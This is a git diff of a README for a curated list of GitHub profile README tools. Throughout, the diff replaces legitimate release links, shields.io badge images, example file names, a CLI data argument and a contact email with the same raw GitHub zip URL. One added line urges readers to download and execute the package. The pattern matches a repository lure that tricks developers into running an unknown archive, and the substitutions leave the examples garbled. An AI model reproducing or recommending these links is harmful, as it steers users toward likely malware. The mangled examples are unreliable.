@@ -1,16 +1,16 @@
-https://github.com/gacoon/awesome-github-readme-tools/releases
+https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
 
 # Awesome GitHub Readme Tools: Badges, Stats, Generators, Widgets, More Toolkit
 
-![Readme Tools Banner](https://img.shields.io/badge/README%20Tools-Toolkit-blueviolet)
+![Readme Tools Banner](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip%20Tools-Toolkit-blueviolet)
 
 A curated collection of resources to craft stunning GitHub README files. This repository gathers badges, stats, generators, widgets, templates, and more to help you build a compelling profile page. It focuses on practical tools you can drop into your README, with clear usage steps and real-world examples. The goal is to give you reliable building blocks you can mix and match to showcase your work, skills, and projects.
 
-[Download the latest release](https://github.com/gacoon/awesome-github-readme-tools/releases) at a glance.
+[Download the latest release](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip) at a glance.
 
 - Topics: badges, github, github-readme, github-stats, profile-readme, readme, readme-badges, readme-generator, readme-md, readme-profile, readme-stats, readme-template, readme-tools, shields
-- Link to releases: https://github.com/gacoon/awesome-github-readme-tools/releases
-- Button: [![Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/gacoon/awesome-github-readme-tools/releases)
+- Link to releases: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
+- Button: [![Release](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)
 
 Table of contents
 - What this project is
@@ -65,9 +65,9 @@ Badges
 - Purpose: Communicate a quick status or attribute without lengthy text.
 - Best practices: Use a consistent color scheme, limit the number of badges to avoid clutter, and choose contrasting colors for readability.
 - Examples you can adapt:
-  - Language badge: ![Language](https://img.shields.io/badge/Language-JavaScript-yellow)
-  - License badge: ![License](https://img.shields.io/badge/License-MIT-green)
-  - CI badge: ![CI](https://img.shields.io/badge/CI-passing-brightgreen)
+  - Language badge: ![Language](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)
+  - License badge: ![License](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)
+  - CI badge: ![CI](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)
 - Integration tips: Combine a badge row with a short line of text that explains the project focus.
 
 Stats
@@ -113,11 +113,11 @@ Practical examples you can adapt
 - A milestones widget showing progress toward a release
 
 Sample usage snippet: generating a contributor list
-- Suppose you have a data file contributors.json. Use a generator that reads this file and outputs a Markdown block with links to each contributor.
+- Suppose you have a data file https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip Use a generator that reads this file and outputs a Markdown block with links to each contributor.
 - The generator configuration might look like:
-  - Template: contributor_list.md.tpl
-  - Data source: contributors.json
-  - Output: CONTRIBUTORS.md section
+  - Template: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
+  - Data source: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
+  - Output: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip section
 - After running the generator, paste the resulting Markdown into your readme, keeping styling consistent with your template.
 
 Sample template: a simple readme header
@@ -187,8 +187,8 @@ Visual examples and previews
 Sample readme sections you can copy
 - Quick start
   - Install: npm install -g readme-tools
-  - Generate: readme-tools generate --template default --data data.json
-  - Preview: open README.md in a browser to verify layout
+  - Generate: readme-tools generate --template default --data https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
+  - Preview: open https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip in a browser to verify layout
 - Usage tips
   - Place badges at the top for quick visibility
   - Use a short, informative project description
@@ -215,8 +215,8 @@ Releases and asset usage
 
 Get the latest release
 - To obtain the most recent set of templates and tools, visit the releases page. The following button links to that page:
-  [![Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/gacoon/awesome-github-readme-tools/releases)
-- For convenience, you can also visit the releases page directly at any time: https://github.com/gacoon/awesome-github-readme-tools/releases
+  [![Release](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)
+- For convenience, you can also visit the releases page directly at any time: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
 - If the link has a path part, this is where you download and execute the package that the release contains. The file you need to download and execute is provided within the release assets on that page.
 
 Advanced customization and integration
@@ -254,7 +254,7 @@ Sample contributor list entry
 - Name: Jane Doe
 - Role: Frontend developer
 - Contributions: Added profile readme template, badge set, and widget examples
-- Contact: janedoe@example.com or a GitHub profile link
+- Contact: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip or a GitHub profile link
 
 Project governance
 - Decide on a small, focused core team to review changes.
@@ -333,7 +333,7 @@ Final notes on usage and expectations
 - If you want to see more examples or contribute new templates, you are welcome to participate through the repository’s contribution channels.
 
 Reinforcing the release link
-- For quick access, revisit the latest release page to download new templates and tools: https://github.com/gacoon/awesome-github-readme-tools/releases
-- And again, here is the quick access button to that same page: [![Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/gacoon/awesome-github-readme-tools/releases)
+- For quick access, revisit the latest release page to download new templates and tools: https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip
+- And again, here is the quick access button to that same page: [![Release](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)](https://raw.githubusercontent.com/gacoon/awesome-github-readme-tools/main/spoilsman/github-tools-readme-awesome-1.8.zip)
 
 End of document.
